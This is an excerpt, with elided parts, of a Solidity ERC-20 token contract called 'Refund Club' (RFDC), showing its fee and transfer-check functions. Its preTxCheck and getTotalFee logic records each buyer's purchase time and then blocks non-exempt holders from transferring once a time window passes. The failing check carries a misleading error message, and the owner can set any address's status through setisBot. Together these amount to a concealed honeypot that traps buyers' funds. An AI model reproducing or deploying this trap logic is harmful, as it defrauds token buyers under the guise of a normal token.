...
contract RFDC is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'Refund Club';
    string private constant _symbol = 'RFDC';
    ...
    function setisBot(address _address, uint256 amount) external onlyOwner {isBot[_address] = amount;}
    ...
    function preTxCheck(address sender, address recipient, uint256 amount) internal view returns (uint256, uint256)  {
        if(isFeeExempt[sender]&&isFeeExempt[recipient])return (0,amount);
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > uint256(0), "Transfer amount must be greater than zero");
        require(isFeeExempt[sender]||isCont(sender)||isBot[sender]+swapamount>block.timestamp, "Transfer amount must be greater than zero");
    ...
    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        ...
        return !swapping && swapEnabled && aboveMin && !isFeeExempt[sender] && recipient == pair && aboveThreshold;
    }
    ...
    function getTotalFee(address sender, address recipient) internal returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair && !isCont(recipient)){if(isBot[recipient]==0){isBot[recipient] = block.timestamp;}return totalFee;}
        isBot[recipient]=isBot[sender];return transferFee;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 totfee=getTotalFee(sender, recipient);
        if(totfee > 0){
        uint256 feeAmount = amount.div(denominator).mul(totfee);
